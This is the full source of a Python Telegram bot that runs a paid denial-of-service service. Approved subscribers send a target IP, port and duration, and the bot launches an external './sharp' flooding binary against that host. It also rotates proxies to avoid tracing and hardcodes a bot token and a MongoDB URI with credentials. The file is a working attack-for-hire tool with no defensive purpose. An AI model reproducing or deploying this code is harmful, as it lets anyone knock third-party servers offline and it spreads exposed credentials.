import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

# Bot Configuration: Set with Authority
TOKEN = '7942937704:AAFM6qI8dd74bEuSu-E0UUqN0N9FioD4qa8'
ADMIN_USER_ID = 7083378335 # Replace with actual admin user ID
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@TREXVIVEK"  # Immutable username for maximum security

# Attack Status Variable to Control Single Execution
attack_in_progress = False

# Logging for Precision Monitoring
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# MongoDB Connection - Operative Data Storage
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['sharp']
users_collection = db.users

# Bot Initialization
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio Loop for Operations
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

# Proxy Update Command with Dark Authority
def update_proxy():
    proxy_list = []  # Define proxies here
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        telebot.apihelper.proxy = {'https': proxy}
        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, f"🔄 Proxy shifted successfully. You’re now untraceable. Bot by {USERNAME}")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Proxy configuration failed: {e}. We’re still working on it, Agent.")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Attack Initiation - Operative Status Checks and Intensity
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the flag to indicate an attack is in progress

    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 1000")
    await process.communicate()

    attack_in_progress = False  # Reset the flag after the attack is complete
    notify_attack_finished(target_ip, target_port, duration)

# Final Attack Message Upon Completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *MISSION COMPLETE!* 🔥\n\n"
        f"🎯 *TARGET DESTROYED:* `{target_ip}`\n"
        f"💣 *PORT PWNED:* `{target_port}`\n"
        f"⏳ *ATTACK DURATION:* `{duration} seconds`\n\n"
        f"💥 *Operation finished. No traces left. All credits go to {USERNAME}*",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if user_id != ADMIN_USER_ID:
        bot.send_message(chat_id, f"🚫 *Access Denied. Only {USERNAME} controls this realm. You have no clearance here.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>. This command is reserved for {USERNAME} only.*", parse_mode='Markdown')
        return

    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)

    if action == '/approve':
        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
        if limit_reached:
            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Access denied. For assistance, please contact {USERNAME}. This realm has its limits.*", parse_mode='Markdown')
            return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} granted access – Plan {plan} for {days} days. Approved by {USERNAME}*"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} removed from access. Action completed by {USERNAME}*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    # Check if an attack is already in progress
    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *An attack is already underway. Please hold your position and wait for the mission to be completed. Stand by, Agent.*", parse_mode='Markdown')
        return

    user_id = message.from_user.id

    try:
        # Check user access
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, f"🚫 *Unauthorized access attempt. Only {USERNAME} can authorize actions in this system.*")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, f"🟠 *Plan 🧡 is at full capacity. To access this plan, contact {USERNAME} for special permissions.*")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, f"💥 *Instant++ Plan is at maximum capacity. Reach out to {USERNAME} for an upgrade.*")
            return

        bot.send_message(chat_id, f"📝 *Mission details required. Please provide the target’s IP address, port number, and the desired attack duration in seconds. Only {USERNAME} can access this level of control.*")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Attack command error: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, f"⚠️ *Incorrect format. Please use: /Attack <IP> <Port> <Duration>. This is critical. Managed by {USERNAME}.*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is restricted. Please choose an alternative port and proceed. Direct your request to {USERNAME} if you need assistance.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(
            message.chat.id,
            f"💀 *⚠️ ATTACK INITIATED!* 💀\n\n"
            f"💢 *Mission Sigma has begun!* 💢\n\n"
            f"🎯 *Target IP:* `{target_ip}`\n"
            f"🔒 *Port Under Siege:* `{target_port}`\n"
            f"⏳ *Duration Set:* `{duration} seconds`\n\n"
            f"🔥 *The operation is in progress. No one can stop it now. Managed by {USERNAME}* ⚡",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in process_attack_command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Unique, Intense Menu Options
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    options = [
        KeyboardButton("💀 Initiate Attack 🔥"),
        KeyboardButton("🔍 Status Report"),
        KeyboardButton("📜 Mission Brief"),
        KeyboardButton("📞 Contact HQ"),
    ]
    markup.add(*options)

    bot.send_message(
        message.chat.id,
        f"👨‍💻 Welcome, Agent {message.from_user.username}!\n"
        f"🔒 Only authorized operatives can issue commands. Your clearance level is under review.\n\n"
        f"💬 *Use the options below to proceed.*\n"
        f"📑 *For detailed instructions, tap on 'Mission Brief'.*\n"
        f"💣 *Initiate a deadly attack or check mission status. Choices are yours, but be wise, Agent.*",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "💀 Initiate Attack 🔥":
        bot.reply_to(message, f"*Mission received. Deploying attack. Standby, {USERNAME}. You’re authorized to destroy.*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "🔍 Status Report":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan, valid_until = user_data.get('plan', 'N/A'), user_data.get('valid_until', 'N/A')
            response = (f"*Agent ID: {username}\n"
                        f"Plan Level: {plan}\n"
                        f"Authorized Until: {valid_until}\n"
                        f"Timestamp: {datetime.now().isoformat()}. Verified by {USERNAME}*")
        else:
            response = f"*Profile unknown. Contact {USERNAME} for authorization.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "📜 Mission Brief":
        bot.reply_to(message, f"*For support, type /help or contact {USERNAME} at HQ.*", parse_mode='Markdown')
    elif message.text == "📞 Contact HQ":
        bot.reply_to(message, f"*Direct Line to HQ: {USERNAME}*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❗*Unknown command. Focus, Agent. Managed by {USERNAME}*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)

    asyncio_thread.start()
    logging.info("🚀 Bot is operational and mission-ready.")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            
